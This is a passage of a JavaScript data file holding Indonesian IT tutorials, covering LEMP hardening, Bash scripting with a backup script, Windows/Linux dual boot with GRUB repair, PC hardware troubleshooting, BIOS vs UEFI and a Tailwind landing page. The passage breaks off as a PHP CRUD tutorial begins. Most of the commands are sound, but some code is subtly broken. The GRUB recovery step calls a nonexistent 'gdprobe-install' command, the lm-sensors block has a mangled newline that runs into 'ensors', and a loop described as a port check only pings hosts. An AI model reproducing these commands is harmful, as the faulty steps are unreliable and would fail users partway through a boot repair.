        "<ul>" +
        "<li>Aktifkan firewall: <code>sudo ufw allow OpenSSH &amp;&amp; sudo ufw allow 'Nginx Full' &amp;&amp; sudo ufw enable</code></li>" +
        "<li>Instal &amp; konfigurasi <strong>Certbot</strong> untuk HTTPS: <code>sudo apt install certbot python3-certbot-nginx &amp;&amp; sudo certbot --nginx -d app.example.com</code></li>" +
        "<li>Matikan <code>server_tokens</code> agar versi Nginx tidak bocor di header respons</li>" +
        "<li>Jangan simpan file <code>.env</code> di document root</li>" +
        "</ul>" +
        '<h2 id="verifikasi">6. Verifikasi</h2>' +
        codeBlock(
          "bash",
          "# cek status service\nsudo systemctl status nginx php8.3-fpm mysql\n\n# tes dari mesin lain\ncurl -I http://app.example.com/\n# HTTP/1.1 200 OK\n# Server: nginx/1.24.0\n\n# buka di browser\n# http://app.example.com/index.php  → halaman phpinfo()"
        ) +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>Kunci LEMP adalah <strong>pemisahan peran</strong>: Nginx melayani static &amp; meneruskan PHP ke FPM, sementara MySQL menangani data. Dengan virtual host terpisah, satu server bisa menampung banyak aplikasi dengan konfigurasi masing-masing.</p>" +
        callout(
          "tip",
          "Gunakan tool manajemen seperti <strong>PHP Composer</strong> dan <strong>WP-CLI</strong> bila kamu mengembangkan aplikasi CMS — jauh lebih efisien daripada mengelola dependency secara manual.",
          "TIPS"
        ),
    },

    "linux-bash-scripting": {
      id: "linux-bash-scripting",
      crumb: "Bash Shell Scripting",
      title: "Automasi Perintah Linux Menggunakan Bash Shell Scripting",
      category: "linux",
      difficulty: "Intermediate",
      excerpt:
        "Belajar menulis script Bash dari dasar: variabel, kondisi, perulangan, hingga membuat script backup dan monitoring yang benar-benar berguna.",
      date: "2026-10-01",
      readTime: 13,
      lab: "Ubuntu 22.04 + cron",
      author: "Admin KBHub",
      tags: ["bash", "scripting", "automasi", "linux"],
      content:
        '<h2 id="dasar">1. Struktur Dasar Script</h2>' +
        "<p>Setiap script Bash diawali <strong>shebang</strong> yang menunjukkan interpreter, lalu simpan dengan ekstensi <code>.sh</code> dan beri izin eksekusi.</p>" +
        codeBlock(
          "bash",
          "#!/bin/bash\n# script pertama saya\n echo \"Halo, dunia dari $(hostname)!\"\n\nchmod +x script.sh    # beri izin eksekusi\n./script.sh           # jalankan"
        ) +
        '<h2 id="variabel">2. Variabel &amp; Input Pengguna</h2>' +
        codeBlock(
          "bash",
          "#!/bin/bash\nNAMA=\"KBHub\"\nthn=$(date +%Y)\necho \"Selamat datang di $NAMA (tahun $thn)\"\n\n# baca input dari user\nread -p \"Masukkan nama folder: \" folder\nmkdir -p \"$folder\"     # SELALU quote variabel!\necho \"Folder '$folder' dibuat.\""
        ) +
        callout(
          "warning",
          "Selalu bungkus variabel dengan tanda kutip (<code>\"$var\"</code>). Tanpa kutip, nilai berisi spasi akan terpecah menjadi beberapa argumen dan bisa memicu perintah yang salah sasaran — celah yang sering disalahkan pada script backup."
        ) +
        '<h2 id="kondisi">3. Percabangan (If / Case)</h2>' +
        codeBlock(
          "bash",
          "#!/bin/bash\njumlah=$(df / | awk 'NR==2 {print $5}' | tr -d '%')\n\nif [ \"$jumlah\" -ge 90 ]; then\n  echo \"PERINGATAN: disk penuh ($jumlah%)\"\nelif [ \"$jumlah\" -ge 70 ]; then\n  echo \"WASPADA: disk mulai penuh ($jumlah%)\"\nelse\n  echo \"Aman: disk terpakai $jumlah%\"\nfi\n\n# case untuk switch sederhana\ncase \"$1\" in\n  start)   echo \"Service dijalankan\" ;;\n  stop)    echo \"Service dihentikan\" ;;\n  *)       echo \"Pakai: $0 {start|stop}\" ;;\nesac"
        ) +
        '<h2 id="loop">4. Perulangan (For / While)</h2>' +
        codeBlock(
          "bash",
          "#!/bin/bash\n# cek port yang listening pada beberapa host\nfor host in 192.168.1.1 192.168.1.2 192.168.1.3; do\n  if ping -c 1 -W 1 \"$host\" >/dev/null 2>&1; then\n    echo \"$host : UP\"\n  else\n    echo \"$host : DOWN\"\n  fi\ndone\n\n# while: baca file baris per baris\nwhile IFS= read -r user; do\n  echo \"Memproses user: $user\"\ndone < daftar-user.txt"
        ) +
        '<h2 id="fungsi">5. Fungsi</h2>' +
        codeBlock(
          "bash",
          "#!/bin/bash\nlog() {\n  echo \"[$(date '+%Y-%m-%d %H:%M:%S')] $1\"\n}\n\nlog \"Memulai proses...\"\nsleep 1\nlog \"Selesai.\"\n\n# fungsi dengan parameter\nhitung() {\n  echo \"Hasil: $(( $1 + $2 ))\"\n}\nhitung 10 25"
        ) +
        '<h2 id="script-backup">6. Studi Kasus: Script Backup Terjadwal</h2>' +
        codeBlock(
          "bash",
          "#!/bin/bash\n# backup.sh — backup folder + kompres + rotasi\nset -euo pipefail\n\nSRC=\"/var/www/app\"\nDEST=\"/backup\"\nSTAMP=$(date +%Y%m%d-%H%M)\nFILE=\"$DEST/app-$STAMP.tar.gz\"\nKEEP=7   # simpan 7 backup terakhir\n\nmkdir -p \"$DEST\"\ntar -czf \"$FILE\" \"$SRC\"\n\necho \"Backup dibuat: $FILE ($(du -h \"$FILE\" | cut -f1))\"\n\n# rotasi: hapus backup lama\ncd \"$DEST\"\nls -1t app-*.tar.gz | tail -n +$((KEEP+1)) | xargs -r rm -f\n\necho \"Rotasi selesai, menyimpan $KEEP terakhir.\""
        ) +
        codeBlock(
          "bash",
          "# jadwalkan via cron (setiap jam 02:00)\ncrontab -e\n0 2 * * * /root/backup.sh >> /var/log/backup.log 2>&1\n\n# uji manual dulu sebelum dipasang cron\nsudo bash /root/backup.sh"
        ) +
        '<h2 id="debug">7. Debug &amp; Praktik Baik</h2>' +
        "<ul>" +
        "<li>Aktifkan <code>set -euo pipefail</code> agar script berhenti saat ada error</li>" +
        "<li>Gunakan <code>set -x</code> atau <code>bash -x script.sh</code> untuk melihat eksekusi per baris</li>" +
        "<li>Simpan pesan error ke <code>stderr</code> dengan <code>echo \"...\" &gt;&amp;2</code></li>" +
        "<li>Uji dengan <code>shellcheck script.sh</code> untuk menangkap kebiasaan buruk</li>" +
        "</ul>" +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>Bash scripting adalah jembatan antara <strong>menjalankan perintah satu per satu</strong> dan <strong>otomasi penuh</strong>. Fokus pada variabel yang di-quote, error handling dengan <code>set -e</code>, dan kebiasaan menguji sebelum menjadwalkan lewat cron.</p>" +
        callout(
          "tip",
          "Tantangan berikutnya: buat script monitoring yang mengirim notifikasi Telegram ketika penggunaan disk melebihi 80%, memakai <code>curl</code> ke Bot API.",
          "LATIHAN"
        ),
    },

    "itsupport-windows-reinstall-dualboot": {
      id: "itsupport-windows-reinstall-dualboot",
      crumb: "Dual Boot Windows 11 & Linux",
      title: "Panduan Dual Boot Windows 11 & Linux Tanpa Kehilangan Data",
      category: "itsupport",
      difficulty: "Intermediate",
      excerpt:
        "Langkah aman memasang dual boot Windows 11 bersama Linux: persiapan partisi, urutan instalasi yang benar, konfigurasi GRUB, dan pemulihan bila boot error.",
      date: "2026-09-25",
      readTime: 14,
      lab: "PC UEFI + SSD 512 GB",
      author: "Admin KBHub",
      tags: ["dual-boot", "windows", "linux", "grub"],
      content:
        callout(
          "warning",
          "<strong>Cadangkan semua data penting</strong> sebelum mempartisi disk. Salah partisi bisa menghapus Windows atau data kamu. Siapkan juga USB bootable dan pastikan laptop/PC dalam keadaan terisi daya penuh.",
          "PERINGATAN"
        ) +
        '<h2 id="konsep">1. Konsep Dual Boot</h2>' +
        "<p>Dual boot berarti <strong>satu disk, dua sistem operasi</strong>, dipilih saat komputer menyala lewat menu boot (GRUB/Windows Boot Manager). Berbeda dari virtualisasi, keduanya memakai hardware secara langsung sehingga performa maksimal.</p>" +
        '<h2 id="persiapan">2. Persiapan</h2>' +
        "<ul>" +
        "<li>Matikan <strong>Fast Startup</strong> di Windows (Control Panel → Power Options) agar partisi Windows tidak terkunci Linux</li>" +
        "<li>Matikan <strong>Secure Boot</strong> sementara bila distro yang dipakai belum mendukungnya</li>" +
        "<li>Buat USB bootable Linux dengan <strong>Rufus</strong> atau <strong>BalenaEtcher</strong></li>" +
        "<li>Defrag/optimasi drive Windows, lalu pastikan ada ≥ 50 GB ruang kosong untuk Linux</li>" +
        "</ul>" +
        '<h2 id="urutan">3. Urutan Instalasi yang Benar</h2>' +
        "<p><strong>Windows dulu, Linux kemudian.</strong> Linux akan mendeteksi Windows dan menambahkannya ke menu GRUB otomatis. Jika dibalik, Windows akan menimpa boot loader dan Linux jadi tidak muncul.</p>" +
        '<h2 id="partisi">4. Mempartisi Disk (dari Windows)</h2>' +
        codeBlock(
          "powershell",
          "# buka Disk Management (diskmgmt.msc)\n# 1. klik kanan volume Windows (C:) → Shrink Volume\n#    sisakan minimal 50000 MB (50 GB) untuk Linux\n# 2. hasilnya menjadi 'Unallocated Space' — JANGAN diformat\n# 3. catat partisi EFI (biasanya 100-260 MB, sistem GPT)\n\ndiskpart\nlist disk\nselect disk 0\nlist partition        # periksa partisi EFI & data"
        ) +
        callout(
          "note",
          "Biarkan ruang kosong <strong>unallocated</strong> — installer Linux (mis. Ubuntu) menyediakan opsi <em>\"Install alongside Windows\"</em> yang otomatis memakai ruang tersebut. Kamu tidak perlu membuat partisi manual kecuali ingin konfigurasi khusus."
        ) +
        '<h2 id="instalasi">5. Instalasi Linux</h2>' +
        "<ol>" +
        "<li>Boot dari USB (ubah boot order via <strong>F2/F12/DEL</strong>)</li>" +
        "<li>Pilih <em>Install Ubuntu</em> → tentukan bahasa, keyboard, dan koneksi Wi-Fi</li>" +
        "<li>Pada pilihan jenis instalasi, pilih <strong>Install alongside Windows Boot Manager</strong></li>" +
        "<li>Selesaikan proses instalasi hingga diminta restart</li>" +
        "</ol>" +
        '<h2 id="grub">6. Menu GRUB &amp; Boot Order</h2>' +
        codeBlock(
          "bash",
          "# setelah install, sistem harus boot ke GRUB\n# untuk memaksa update menu GRUB dari Linux:\nsudo update-grub\n# Generating grub configuration file ...\n#   found Windows Boot Manager on /dev/sda1\n\n# ubah urutan boot default (mis. default ke Windows)\nsudo nano /etc/default/grub\n#   GRUB_DEFAULT=2\n#   GRUB_TIMEOUT=10\nsudo update-grub"
        ) +
        '<h2 id="troubleshooting">7. Troubleshooting</h2>' +
        '<table><thead><tr><th>Masalah</th><th>Solusi</th></tr></thead><tbody>' +
        "<tr><td>Windows tidak muncul di GRUB</td><td>Jalankan <code>sudo os-prober &amp;&amp; sudo update-grub</code></td></tr>" +
        "<tr><td>Terjebak di <code>grub rescue</code></td><td><code>set prefix=(hd0,gpt1)/boot/grub</code> lalu <code>insmod normal &amp;&amp; normal</code></td></tr>" +
        "<tr><td>Jam Linux salah</td><td>Matikan Fast Startup, set <code>timedatectl set-local-rtc 1</code></td></tr>" +
        "<tr><td>Wi-Fi tidak jalan</td><td>Instal driver: <code>ubuntu-drivers autoinstall</code></td></tr>" +
        "<tr><td>Boot ke Windows malah error</td><td>Disable Fast Startup &amp; periksa partisi NTFS tidak corrupted</td></tr>" +
        "</tbody></table>" +
        '<h2 id="pemulihan-grub">8. Pemulihan GRUB dari Live USB</h2>' +
        "<p>Jika komputer tersangkut di <code>grub rescue</code> atau boot loader hilang, perbaiki dari Live USB. Kuncinya: mount partisi root &amp; EFI, lalu masuk <strong>chroot</strong> agar perintah dijalankan seolah Linux sudah terpasang.</p>" +
        codeBlock(
          "bash",
          "# boot dari Live USB Ubuntu, pilih 'Try Ubuntu'\n# 1. temukan partisi root Linux (mis. sda2) dan EFI (sda1)\nsudo fdisk -l\n\n# 2. mount partisi root lalu chroot\nsudo mount /dev/sda2 /mnt\nsudo mount --bind /dev  /mnt/dev\nsudo mount --bind /proc /mnt/proc\nsudo mount --bind /sys  /mnt/sys\nsudo mount /dev/sda1 /mnt/boot/efi   # partisi EFI\nsudo chroot /mnt\n\n# 3. pasang ulang GRUB ke EFI\ngdprobe-install --target=x86_64-efi --efi-directory=/boot/efi --bootloader-id=UBUNTU\n\n# 4. regenerate menu\nupdate-grub\n\n# 5. keluar, reboot, cabut USB\nexit\nsudo reboot"
        ) +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>Kunci dual boot yang aman: <strong>backup → matikan Fast Startup → urutan Windows dulu, Linux kemudian → biarkan installer Linux menangani GRUB</strong>. Dengan urutan ini, risiko kehilangan data dan boot error bisa diminimalkan.</p>" +
        callout(
          "tip",
          "Ingin mencoba Linux tanpa risiko sama sekali? Gunakan mode <strong>Live USB</strong> dulu untuk mengetes kompatibilitas hardware sebelum memutuskan instalasi permanen.",
          "TIPS"
        ),
    },

    "itsupport-pc-troubleshooting": {
      id: "itsupport-pc-troubleshooting",
      crumb: "Troubleshooting Hardware PC",
      title: "Panduan Troubleshooting Hardware PC: RAM Unreadable, No Display, & Overheating",
      category: "itsupport",
      difficulty: "Beginner",
      excerpt:
        "Metode sistematis mendiagnosa masalah hardware PC: RAM tidak terbaca, layar hitam tanpa display, dan suhu berlebih — lengkap dengan alur diagnostik bertahap.",
      date: "2026-09-22",
      readTime: 12,
      lab: "PC Desktop / Workstation",
      author: "Admin KBHub",
      tags: ["hardware", "troubleshooting", "ram", "diagnostic"],
      content:
        '<h2 id="mindset">1. Mindset Diagnostik</h2>' +
        "<p>Triase hardware yang benar selalu mengikuti prinsip <strong>termurah &amp; termudah dulu</strong>: periksa kabel → power → komponen yang mudah dicabut → komponen inti. Jangan langsung mengganti part sebelum memastikan penyebabnya.</p>" +
        '<h2 id="ram">2. RAM Unreadable / Memory Error</h2>' +
        "<p>Gejala: PC menyala (fan berputar) tapi muncul beep code, atau Windows menampilkan <em>&quot;Your PC ran into a problem&quot;</em> / BSOD <code>MEMORY_MANAGEMENT</code>.</p>" +
        "<ol>" +
        "<li><strong>Cabut &amp; bersihkan RAM</strong> — lepas modul, bersihkan pin kuningan dengan penghapus karet, pasang kembali hingga klip terkunci</li>" +
        "<li><strong>Uji satu per satu</strong> — jika ada 2 stick, tes masing-masing secara terpisah pada slot yang sama untuk menemukan modul rusak</li>" +
        "<li><strong>Ganti slot</strong> — kadang slot DIMM yang bermasalah, bukan modulnya</li>" +
        "<li><strong>Jalankan diagnosa</strong> — gunakan tool memtest</li>" +
        "</ol>" +
        codeBlock(
          "bash",
          "# uji RAM dari Linux (Live USB)\nsudo apt install memtest86+\nsudo memtest86+\n# biarkan minimal 1 siklus penuh tanpa error\n\n# alternatif cepat dari Windows PowerShell\nmdsched.exe            # pilih 'Restart now and check'\n\n# cek kapasitas terdeteksi\nwmic memorychip get capacity,speed,devicelocator"
        ) +
        '<h2 id="no-display">3. No Display (Layar Hitam)</h2>' +
        "<p>PC menyala tapi monitor tetap <em>No Signal</em>. Urutan cek:</p>" +
        '<table><thead><tr><th>Langkah</th><th>Tindakan</th></tr></thead><tbody>' +
        "<tr><td>1</td><td>Pastikan monitor menyala &amp; input source benar (HDMI/DP)</td></tr>" +
        "<tr><td>2</td><td>Cabut pasang kabel video, coba port/kabel lain</td></tr>" +
        "<tr><td>3</td><td>Dengarkan <strong>beep code</strong> — beep panjang = masalah RAM/GPU</td></tr>" +
        "<tr><td>4</td><td>Lepas GPU, tancapkan langsung ke port video onboard</td></tr>" +
        "<tr><td>5</td><td>Reset CMOS (jumper CLR_CMOS / cabut baterai BIOS 5 menit)</td></tr>" +
        "<tr><td>6</td><td>Uji PSU — cek tegangan 12V/5V/3.3V dengan multimeter atau PSU tester</td></tr>" +
        "</tbody></table>" +
        callout(
          "note",
          "Beep code adalah bahasa motherboard saat POST gagal. <strong>Satu beep pendek</strong> = normal (POST sukses). Pola berbeda antar merek — cek manual motherboard untuk arti pastinya (AMI, Award, ASUS)."
        ) +
        '<h2 id="overheating">4. Overheating</h2>' +
        "<p>Gejala: PC tiba-tiba <em>shutdown</em>, performa melambat (thermal throttling), atau suhu CPU di atas 90°C.</p>" +
        codeBlock(
          "bash",
          "# pantau suhu di Linux\nsudo apt install lm-sensors\ensors\nwatch -n1 sensors        # awasi suhu CPU & fan RPM\n\n# Windows: gunakan HWMonitor / Core Temp\n# standar aman saat idle: 30-50°C\n# beban penuh : di bawah 85-90°C"
        ) +
        "<ul>" +
        "<li>Bersihkan debu heatsink &amp; kipas dengan <strong>compressed air</strong></li>" +
        "<li>Ganti <strong>thermal paste</strong> yang sudah kering (disarankan tiap 2–3 tahun)</li>" +
        "<li>Pastikan aliran udara case benar: intake depan/bawah, exhaust belakang/atas</li>" +
        "<li>Jangan letakkan PC di permukaan lembut (karpet) yang menutup ventilasi</li>" +
        "</ul>" +
        '<h2 id="alur">5. Alur Diagnostik Ringkas</h2>' +
        codeBlock(
          "bash",
          "# ringkasan alur triase\n1. Power cek   → kabel, saklar PSU, koneksi panel depan\n2. POST cek    → dengar beep, LED debug motherboard\n3. Minimal PC  → cabut GPU, HDD, RAM berlebih (sisakan 1)\n4. Re-seat     → pasang ulang semua kabel & modul\n5. Swap uji    → ganti dengan part cadangan yang diketahui baik\n6. Docs        → catat gejala + kode error untuk riwayat"
        ) +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>Troubleshooting hardware bukan soal menebak, melainkan <strong>mempersempit kemungkinan secara sistematis</strong>. Catat setiap gejala, ubah satu variabel dalam satu kali uji, dan selalu mulai dari komponen yang paling mudah diakses.</p>" +
        callout(
          "tip",
          "Simpan satu modul RAM dan kabel video cadangan di meja kerja kamu. Komponen pengganti yang sudah diketahui baik adalah alat diagnostik paling cepat untuk membedakan 'part rusak' vs 'konfigurasi salah'.",
          "TIPS"
        ),
    },

    "itsupport-bios-uefi-guide": {
      id: "itsupport-bios-uefi-guide",
      crumb: "BIOS vs UEFI",
      title: "Memahami Perbedaan BIOS vs UEFI dan Cara Menyesuaikan Boot Priority",
      category: "itsupport",
      difficulty: "Beginner",
      excerpt:
        "Penjelasan lengkap perbedaan BIOS legacy dan UEFI modern, cara masuk ke pengaturan, mengubah boot priority, serta konsep Secure Boot dan GPT vs MBR.",
      date: "2026-09-15",
      readTime: 10,
      lab: "PC/Laptop UEFI (ASUS, Dell, Lenovo)",
      author: "Admin KBHub",
      tags: ["bios", "uefi", "boot", "firmware"],
      content:
        '<h2 id="perbedaan">1. Perbedaan BIOS dan UEFI</h2>' +
        "<p><strong>BIOS</strong> (Legacy) adalah firmware lama berbasis 16-bit, sementara <strong>UEFI</strong> adalah penerusnya yang 64-bit, mendukung antarmuka grafis, mouse, partisi besar, dan boot lebih cepat.</p>" +
        '<table><thead><tr><th>Aspek</th><th>BIOS Legacy</th><th>UEFI</th></tr></thead><tbody>' +
        "<tr><td>Partisi disk</td><td>MBR (maks 2 TB)</td><td>GPT (hingga 9 ZB)</td></tr>" +
        "<tr><td>Boot loader</td><td>16-bit real mode</td><td>64-bit, EFI System Partition</td></tr>" +
        "<tr><td>Antarmuka</td><td>Teks biru</td><td>Grafis + dukungan mouse</td></tr>" +
        "<tr><td>Boot time</td><td>Lebih lambat</td><td>Lebih cepat</td></tr>" +
        "<tr><td>Keamanan</td><td>Terbatas</td><td>Secure Boot, TPM</td></tr>" +
        "<tr><td>Partisi boot</td><td>1 partisi aktif</td><td>Banyak partisi boot</td></tr>" +
        "</tbody></table>" +
        '<h2 id="masuk">2. Cara Masuk ke BIOS/UEFI</h2>' +
        codeBlock(
          "bash",
          "# tekan saat komputer baru menyala (belum masuk OS):\n#   ASUS        : Del atau F2\n#   Dell        : F2\n#   Lenovo      : F2 atau Fn+F2\n#   HP          : Esc atau F10\n#   Acer        : F2 atau Del\n\n# DARI WINDOWS (tanpa menekan tombol cepat-cepat):\n#   Settings → System → Recovery → Advanced startup → Restart now\n#   Troubleshoot → Advanced → UEFI Firmware Settings → Restart\n\n# alternatif cepat via PowerShell\nshutdown /r /fw /t 0"
        ) +
        callout(
          "note",
          "Di Windows 11 dengan Fast Startup aktif, jendela menekan tombol BIOS bisa sangat sempit. Cara paling andal adalah masuk lewat <strong>Advanced startup</strong> seperti di atas."
        ) +
        '<h2 id="boot-priority">3. Mengubah Boot Priority</h2>' +
        "<ol>" +
        "<li>Masuk ke BIOS/UEFI (lihat langkah 2)</li>" +
        "<li>Cari tab <strong>Boot</strong> / <strong>Boot Menu</strong></li>" +
        "<li>Atur urutan: misal <em>USB Flash Drive</em> paling atas untuk instalasi, kembalikan ke <em>Windows Boot Manager</em> setelah selesai</li>" +
        "<li>Simpan dengan <strong>F10 → Save &amp; Exit</strong></li>" +
        "</ol>" +
        codeBlock(
          "bash",
          "# menu boot sekali jalan (tanpa mengubah setting permanen):\n#   Dell        : F12\n#   HP          : F9\n#   ASUS        : F8\n#   Lenovo      : F12\n# → pilih perangkat yang diinginkan langsung dari daftar"
        ) +
        '<h2 id="secure-boot">4. Secure Boot &amp; CSM</h2>' +
        "<ul>" +
        "<li><strong>Secure Boot</strong> hanya mengizinkan boot loader yang ter-sign — perlu <strong>dimatikan</strong> untuk instalasi distro Linux tertentu atau OS lama</li>" +
        "<li><strong>CSM (Compatibility Support Module)</strong> mengaktifkan mode legacy BIOS — matikan bila ingin UEFI penuh</li>" +
        "<li><strong>TPM 2.0</strong> wajib aktif untuk Windows 11</li>" +
        "</ul>" +
        callout(
          "warning",
          "Mengubah mode boot dari UEFI ke Legacy (atau sebaliknya) pada disk yang sudah terisi OS bisa membuat sistem <strong>tidak bisa boot sama sekali</strong>, karena format partisi (GPT vs MBR) tidak cocok. Hanya ubah setting ini saat benar-benar perlu dan paham konsekuensinya."
        ) +
        '<h2 id="verifikasi">5. Verifikasi Setelah Perubahan</h2>' +
        codeBlock(
          "powershell",
          "# di Windows, pastikan mode boot sesuai\nmsinfo32\n#   BIOS Mode            : UEFI\n#   Secure Boot State    : On\n\n# dari PowerShell\nConfirm-SecureBootUEFI   # True / False / pemanggilan tidak didukung"
        ) +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>Untuk penggunaan modern, <strong>UEFI + GPT + Secure Boot</strong> adalah standar yang disarankan — terutama untuk Windows 11. Pahami kapan harus mematikan Secure Boot dan CSM, dan selalu kembalikan prioritas boot ke hard disk setelah selesai instalasi agar komputer tidak tersendat menunggu USB yang tidak ada.</p>" +
        callout(
          "tip",
          "Catat konfigurasi BIOS sebelum mengubahnya (foto layar). Jika terjadi masalah, kamu bisa mengembalikan setting ke kondisi semula dengan cepat.",
          "TIPS"
        ),
    },

    "webdev-tailwind-responsive": {
      id: "webdev-tailwind-responsive",
      crumb: "Landing Page Tailwind Responsive",
      title: "Membuat Tampilan Landing Page Responsive Menggunakan Tailwind CSS",
      category: "webdev",
      difficulty: "Beginner",
      excerpt:
        "Praktik membangun landing page yang rapi di segala ukuran layar dengan Tailwind CSS: utility classes, breakpoint responsive, flex/grid, hingga komponen navbar & hero.",
      date: "2026-10-08",
      readTime: 12,
      lab: "VS Code + Browser Modern",
      author: "Admin KBHub",
      tags: ["tailwind", "css", "responsive", "landing-page"],
      content:
        '<h2 id="setup">1. Setup Tanpa Build</h2>' +
        "<p>Tailwind bisa dipakai langsung lewat CDN — cocok untuk belajar dan prototipe tanpa perlu Node.js atau konfigurasi bundler.</p>" +
        codeBlock(
          "html",
          "<!DOCTYPE html>\n<html lang=\"id\">\n<head>\n  <meta charset=\"UTF-8\">\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n  <title>Landing Page Responsive</title>\n  <script src=\"https://cdn.tailwindcss.com\"></script>\n</head>\n<body class=\"bg-slate-900 text-slate-100\">\n  <h1 class=\"text-3xl font-bold text-center py-10\">Halo Tailwind!</h1>\n</body>\n</html>"
        ) +
        '<h2 id="breakpoint">2. Sistem Breakpoint Responsive</h2>' +
        "<p>Tailwind memakai <strong>mobile-first</strong>: gaya dasar berlaku untuk layar kecil, lalu ditimpa oleh varian <code>md:</code>, <code>lg:</code>, <code>xl:</code> pada layar lebih besar.</p>" +
        '<table><thead><tr><th>Prefix</th><th>Min-width</th><th>Target</th></tr></thead><tbody>' +
        "<tr><td>(tanpa prefix)</td><td>0 px</td><td>Mobile</td></tr>" +
        "<tr><td><code>sm:</code></td><td>640 px</td><td>Layar besar ponsel</td></tr>" +
        "<tr><td><code>md:</code></td><td>768 px</td><td>Tablet</td></tr>" +
        "<tr><td><code>lg:</code></td><td>1024 px</td><td>Laptop</td></tr>" +
        "<tr><td><code>xl:</code></td><td>1280 px</td><td>Desktop</td></tr>" +
        "</tbody></table>" +
        codeBlock(
          "html",
          "<!-- teks kecil di mobile, besar di desktop -->\n<h1 class=\"text-2xl md:text-4xl lg:text-5xl font-extrabold\">\n  Judul yang Membesar Bertahap\n</h1>\n\n<!-- lebar penuh di mobile, 2 kolom di tablet -->\n<div class=\"grid grid-cols-1 md:grid-cols-2 gap-6\">\n  <div class=\"rounded-xl bg-slate-800 p-6\">Kartu A</div>\n  <div class=\"rounded-xl bg-slate-800 p-6\">Kartu B</div>\n</div>"
        ) +
        '<h2 id="navbar">3. Navbar Responsif</h2>' +
        codeBlock(
          "html",
          "<nav class=\"flex items-center justify-between px-6 py-4 bg-slate-800/80 backdrop-blur\">\n  <span class=\"text-xl font-bold\">Brand.</span>\n\n  <!-- menu langsung di desktop, tersembunyi di mobile -->\n  <div class=\"hidden md:flex gap-6 text-sm text-slate-300\">\n    <a href=\"#fitur\" class=\"hover:text-emerald-400\">Fitur</a>\n    <a href=\"#harga\" class=\"hover:text-emerald-400\">Harga</a>\n    <a href=\"#kontak\" class=\"hover:text-emerald-400\">Kontak</a>\n  </div>\n\n  <!-- tombol hamburger, hanya muncul di mobile -->\n  <button class=\"md:hidden text-2xl\" aria-label=\"Menu\">&#9776;</button>\n</nav>"
        ) +
        '<h2 id="hero">4. Section Hero</h2>' +
        codeBlock(
          "html",
          "<header class=\"min-h-[70vh] flex flex-col items-center justify-center text-center px-6\">\n  <span class=\"mb-4 rounded-full border border-emerald-500/30 bg-emerald-500/10 px-4 py-1 text-xs text-emerald-400\">\n    Versi 2.0 sudah rilis\n  </span>\n  <h1 class=\"max-w-3xl text-4xl font-extrabold leading-tight md:text-6xl\">\n    Bangun Antarmuka Lebih Cepat\n  </h1>\n  <p class=\"mt-4 max-w-xl text-slate-400 md:text-lg\">\n    Landing page responsif tanpa repot — cukup pilih utility class yang tepat.\n  </p>\n  <div class=\"mt-8 flex flex-col gap-3 sm:flex-row\">\n    <a href=\"#daftar\" class=\"rounded-lg bg-emerald-500 px-6 py-3 font-semibold text-slate-900 hover:bg-emerald-400\">Mulai Gratis</a>\n    <a href=\"#demo\" class=\"rounded-lg border border-slate-700 px-6 py-3 hover:border-slate-500\">Lihat Demo</a>\n  </div>\n</header>"
        ) +
        callout(
          "tip",
          "Perhatikan <code>flex-col sm:flex-row</code> pada tombol CTA — di mobile tombol menumpuk vertikal (lebih mudah disentuh), di layar lebar berdampingan. Inilah pola responsive paling sering dipakai."
        ) +
        '<h2 id="tips">5. Praktik Responsive yang Benar</h2>' +
        "<ul>" +
        "<li>Selalu tambahkan <code>&lt;meta name=\"viewport\"&gt;</code> — tanpa ini, mobile hanya mensimulasikan layar lebar</li>" +
        "<li>Uji dari kecil ke besar (<strong>mobile-first</strong>), bukan sebaliknya</li>" +
        "<li>Perhatikan area sentuh: minimal 44×44 px untuk tombol di mobile</li>" +
        "<li>Gunakan <code>space-y-*</code> atau <code>gap-*</code> alih-alih margin manual agar spasi konsisten</li>" +
        "<li>Cek gambar: pakai <code>max-w-full h-auto</code> agar tidak meluber dari container</li>" +
        "</ul>" +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>Kekuatan Tailwind terletak pada <strong>utility yang bisa dibaca langsung di markup</strong>. Kuasai tiga hal ini — breakpoint <code>md:</code>/<code>lg:</code>, layout <code>flex</code>/<code>grid</code>, dan pola <em>mobile-first</em> — maka hampir semua komponen landing page bisa dibuat tanpa menulis CSS kustom sama sekali.</p>" +
        callout(
          "note",
          "Untuk produksi, pertimbangkan memasang Tailwind via build tool (<code>npm i -D tailwindcss</code>) agar CSS yang dihasilkan hanya berisi class yang benar-benar dipakai, bukan seluruh framework.",
          "CATATAN"
        ),
    },

    "webdev-php-crud-mysql": {
      id: "webdev-php-crud-mysql",
      crumb: "CRUD PHP & MySQL",
      title: "Membuat Sistem CRUD Sederhana dengan PHP Native dan MySQL",
      category: "webdev",
      difficulty: "Intermediate",
      excerpt:
        "Tutorial lengkap membuat aplikasi CRUD (Create, Read, Update, Delete) dengan PHP native dan MySQL, memakai PDO prepared statements anti-SQL injection.",
      date: "2026-09-26",
      readTime: 16,
      lab: "XAMPP / PHP 8.2 + MySQL 8",
      author: "Admin KBHub",
      tags: ["php", "mysql", "crud", "pdo"],
      content:
        callout(
          "warning",
          "Materi ini untuk <strong>belajar & lingkungan lokal</strong>. Untuk produksi, tambahkan autentikasi, CSRF token, dan validasi menyeluruh. Selalu gunakan <strong>prepared statements</strong> — jangan pernah menyusun SQL dari input user secara langsung."
        ) +
        '<h2 id="database">1. Siapkan Database &amp; Tabel</h2>' +
        codeBlock(
          "sql",
          "CREATE DATABASE IF NOT EXISTS db_crud;\nUSE db_crud;\n\nCREATE TABLE mahasiswa (\n  id        INT AUTO_INCREMENT PRIMARY KEY,\n  nama      VARCHAR(100) NOT NULL,\n  email     VARCHAR(100) NOT NULL UNIQUE,\n  jurusan   VARCHAR(50),\n  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP\n);\n\nINSERT INTO mahasiswa (nama, email, jurusan) VALUES\n('Budi Santoso', 'budi@mail.com', 'Teknik Informatika'),\n('Siti Aminah',  'siti@mail.com','Sistem Informasi');"
        ) +
        '<h2 id="koneksi">2. Koneksi Database dengan PDO</h2>' +
        codeBlock(
          "php",
